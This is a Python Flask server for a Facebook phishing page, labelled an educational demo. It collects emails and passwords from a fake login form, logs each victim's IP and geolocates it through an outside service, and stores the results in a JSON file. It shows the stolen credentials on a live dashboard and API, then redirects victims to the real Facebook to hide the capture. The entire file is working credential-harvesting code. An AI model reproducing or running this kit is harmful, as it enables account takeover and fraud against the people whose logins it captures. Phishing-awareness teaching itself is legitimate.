from flask import Flask, request, redirect, jsonify, send_file
import json
from datetime import datetime
import os
import requests  # used to call external IP geolocation service
import ipaddress  # for detecting private/loopback addresses

app = Flask(__name__, static_folder='.', static_url_path='')

# File to store credentials
CREDENTIALS_FILE = 'credentials.json'

def save_credentials(email, password, ip=None, location=None):
    """Save credentials to JSON file"""
    credentials_data = []
    
    # Load existing credentials if file exists
    if os.path.exists(CREDENTIALS_FILE):
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                credentials_data = json.load(f)
        except:
            credentials_data = []
    
    # Append new credential
    entry = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat()
    }
    if ip:
        entry['ip'] = ip
    if location:
        entry['location'] = location
    credentials_data.append(entry)
    
    # Save back to file
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(credentials_data, f, indent=2)

def clear_credentials():
    """Clear all stored credentials"""
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)

@app.route('/')
def index():
    """Serve the login page"""
    return send_file('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    # client IP (respect X-Forwarded-For if behind proxy)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    location = None

    # if the IP is local or private we can skip the external lookup
    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_loopback or addr.is_private:
            location = 'Local network'
        else:
            # attempt simple geolocation using ip-api.com (free, no key required)
            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                # build a human-readable location string
                pieces = []
                for field in ('city', 'regionName', 'country'):
                    if data.get(field):
                        pieces.append(data[field])
                if pieces:
                    location = ", ".join(pieces)
    except Exception:
        # if anything goes wrong just ignore location
        location = None
    
    # Save credentials
    if email and password:
        save_credentials(email, password, ip=ip, location=location)
        print(f"✓ Credentials captured: {email} (ip={ip} location={location})")
    
    # Redirect to Facebook
    return redirect('https://www.facebook.com')

@app.route('/view-credentials', methods=['GET'])
def view_credentials():
    """View all captured credentials (for presentation only)"""
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            credentials = json.load(f)
        return jsonify(credentials)
    return jsonify([])

@app.route('/dashboard')
def dashboard():
    """Live credentials dashboard for presentation"""
    return send_file('dashboard.html')

@app.route('/api/credentials', methods=['GET'])
def api_credentials():
    """API endpoint for dashboard to fetch credentials"""
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            credentials = json.load(f)
        return jsonify({
            'count': len(credentials),
            'credentials': credentials
        })
    return jsonify({
        'count': 0,
        'credentials': []
    })

@app.route('/api/clear-credentials', methods=['POST'])
def api_clear():
    """Clear all credentials"""
    clear_credentials()
    return jsonify({'status': 'success', 'message': 'All credentials cleared'})

if __name__ == '__main__':
    print("=" * 50)
    print("Facebook Phishing Demo - Educational Use Only")
    print("=" * 50)
    print("\n▶ Server running on http://localhost:5000")
    print("▶ Login page: http://localhost:5000/")
    print("▶ Live Dashboard: http://localhost:5000/dashboard")
    print("▶ Credentials API: http://localhost:5000/api/credentials")
    print("▶ Credentials stored in: credentials.json\n")
    app.run(debug=False, port=5000)
